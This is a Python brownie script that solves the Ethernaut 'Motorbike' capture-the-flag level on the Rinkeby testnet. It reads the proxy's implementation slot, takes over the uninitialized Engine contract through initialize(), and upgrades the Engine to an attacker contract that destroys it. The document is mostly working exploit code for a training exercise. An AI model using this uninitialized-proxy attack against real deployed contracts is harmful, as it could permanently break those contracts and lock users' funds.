from brownie import accounts, config, Motorbike, Engine, Hacker
from web3 import Web3

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0xfAb76416894Eb03f438E8193AC8B5A34c2b7571f"
motorbike = Motorbike.at(instance_address)

# set variables
slot = "0x360894A13BA1A3210667C828492DB98DCA3E2076CC3735A920A3CA505D382BBC"
zero = "0x"

# ---------------------------------------------
# to pass this level we must explode the engine
# ---------------------------------------------


def level_completed():
    return code == zero


def exploit():
    # set up web3
    rpc_url = config["wallets"]["endpoint"]
    w3 = Web3(Web3.HTTPProvider(rpc_url))

    # get address of engine
    address_bytes = w3.eth.get_storage_at(instance_address, slot)
    address_hex = Web3.toHex(address_bytes)
    print(address_hex)
    address = "0x" + address_hex[26:]
    print(address)

    # call initialize
    engine = Engine.at(address)
    tx = engine.initialize({"from": account})
    tx.wait(1)
    print(engine.upgrader())

    # deploy hacker contract
    hacker = Hacker.deploy({"from": account})

    # call upgradeToAndCall with hacker contract and initialize sig as arguments
    sig = hacker.initialize.signature
    tx = engine.upgradeToAndCall(hacker.address, sig, {"from": account})
    tx.wait(1)

    # confirm we have completed the level
    global code
    code_bytes = w3.eth.get_code(engine.address)
    code = Web3.toHex(code_bytes)
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
